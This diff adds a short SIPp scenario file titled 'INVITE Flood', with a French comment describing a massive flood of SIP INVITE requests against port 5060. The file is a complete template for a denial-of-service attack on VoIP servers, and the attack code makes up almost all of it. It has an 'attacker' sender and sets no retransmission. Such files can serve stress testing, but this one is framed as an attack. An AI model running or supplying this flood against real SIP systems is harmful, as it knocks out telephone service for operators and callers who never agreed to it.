@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<scenario name="INVITE Flood">
+  <!-- Flood massif d’INVITE sur le port 5060 sans [service] -->
+  <send retrans="0">
+    <![CDATA[
+    INVITE sip:[remote_ip]:5060 SIP/2.0
+    Via: SIP/2.0/UDP [local_ip]:[local_port];branch=[branch]
+    From: <sip:attacker@[local_ip]>;tag=[call_number]
+    To: <sip:[remote_ip]>
+    Call-ID: flood-[call_number]@[local_ip]
+    CSeq: [cseq] INVITE
+    Max-Forwards: 70
+    Contact: <sip:attacker@[local_ip]:[local_port]>
+    Content-Length: 0
+    ]]>
+  </send>
+  <nop/>
+</scenario>
